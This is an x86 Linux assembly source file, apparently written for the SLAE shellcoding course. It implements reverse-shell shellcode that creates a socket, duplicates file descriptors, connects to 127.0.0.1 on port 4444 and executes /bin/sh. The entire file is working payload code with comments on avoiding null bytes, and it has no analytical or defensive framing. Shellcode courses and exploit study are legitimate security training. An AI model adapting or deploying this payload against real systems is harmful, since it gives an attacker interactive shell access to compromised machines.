; Reverse shell to 127.0.0.1:4444
; Author: Ty Gast // SLAE-1461

global _start

section .text
_start:

  ; socket call
  xor eax, eax
  push eax		; push 0x0 for protocol
  inc eax
  mov ebx, eax		; Call 1 (socket) for sys_socketcall
  push eax		; push 0x1 for type
  inc eax
  push eax		; push 0x2 for domain
  mov ecx, esp		; Args* for sys_socketcall
  mov al, 0x66		; sys_socketcall value
  int 0x80

  ; socket returned fd, iterate through dup2 with the new fd in eax
  mov ebx, eax		; save off new fd
  mov ecx, ebx		; put ebx (new fd) in ecx then decrement
  dec ecx
repeat_dup2:
  mov al, 0x3f
  int 0x80
  dec ecx		; decrement ecx and repeat dup2 if not negative
  jns repeat_dup2

  ; connect call
  mov esi, ebx		; fd from socket call
  pop ebx		; loads 3 (pop the 2, the inc) in ebx for connect
  inc ebx
  pop edx		; loads 1 in edx then shift to get 0x10
  shl edx, 4
  push 0x0100007f	; yes it has nulls, maybe pick an ip that doesn't
  mov ax, 0x5c11	; build sockaddr_in, avoid the 0x00 byte
  shl eax, 16
  mov al, 2		
  push eax
  mov ecx, esp		; get address for sockaddr_in *
  push edx
  push ecx
  push esi
  mov ecx, esp
  xor eax, eax
  mov al, 0x66
  int 0x80

  ; sys_execve to run a shell
  xor eax, eax
  push eax
  push 0x68732f6e
  push 0x69622f2f
  mov ebx, esp
  push eax
  mov edx, esp
  push ebx
  mov ecx, esp
  mov al, 11
  int 0x80


